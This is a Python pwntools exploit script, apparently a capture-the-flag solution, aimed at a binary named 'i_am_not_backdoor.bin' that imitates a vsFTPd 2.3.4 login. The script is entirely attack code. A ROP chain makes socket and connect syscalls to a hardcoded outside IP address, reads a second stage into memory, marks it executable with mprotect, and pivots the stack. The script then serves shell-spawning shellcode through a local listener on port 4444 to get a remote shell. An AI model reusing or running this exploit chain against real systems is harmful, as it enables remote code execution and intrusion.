#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("i_am_not_backdoor.bin")

gs = """
b *0x00000000004018cc
"""
RDI_RET = 0x00000000004024b8
RSI_RET = 0x00000000004097f2
RDX_RET = 0x00000000004018e4
RAX_RET = 0x000000000042f8e7
RCX_RET = 0x449ee3
ptr_rdi7_rcx = 0x428f0c  # mov qword ptr [rdi + 0xf], rcx ; ret
ptr_rsi_rdx = 0x46e622  # mov qword ptr [rsi], rdx ; ret
SYSCALL = 0x000000000042f81b

host = "18.136.148.247"
port = 18563
sock_addr = p16(2) + p16(port, endian='big') + binary_ip(host)


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


l = listen(4444)
p = start()

chain = (
    p64(RAX_RET)+p64(0x29) +
    p64(RDI_RET)+p64(2) +
    p64(RSI_RET)+p64(1) +
    p64(RDX_RET)+p64(0) +
    p64(SYSCALL) +

    p64(RSI_RET)+p64(0x4a7b90) +
    p64(RDX_RET)+sock_addr +
    p64(0x46e622) +

    p64(RDI_RET)+p64(0) +
    p64(RDX_RET)+p64(0x10) +
    p64(RAX_RET)+p64(0x2a) +
    p64(SYSCALL) +

    p64(RSI_RET)+p64(0x4a6000) +
    p64(RDX_RET)+p64(0x1000) +
    p64(e.sym.read) +

    p64(0x4a6000)
)

# p.sendafter(b'220 (vsFTPd 2.3.4)\r\n',  chain[128:256])
p.send(chain[128:256])
# p.sendafter(b'331 Please specify the password.\r\n', chain[0:128])
p.send(chain[0:128])
# p.sendafter(b'530 Login incorrect.\r\n',
p.send(
    b'\0'*8 +

    p64(RDI_RET)+p64(0x4a6000) +
    p64(RSI_RET)+p64(0x2000) +
    p64(RDX_RET)+p64(7) +
    p64(e.sym.mprotect) +

    p64(RDI_RET) + p64(0x4a78e0) + p64(RCX_RET) +
    b"\x48\x81\xEC\x70\x01\x00\x00\xC3".ljust(8, b'\0') + p64(ptr_rdi7_rcx) +

    p64(0x4a78e0+0xf)
)
p.interactive()
l.wait_for_connection()
l.send(
    asm(shellcraft.sh())
)
l.interactive()
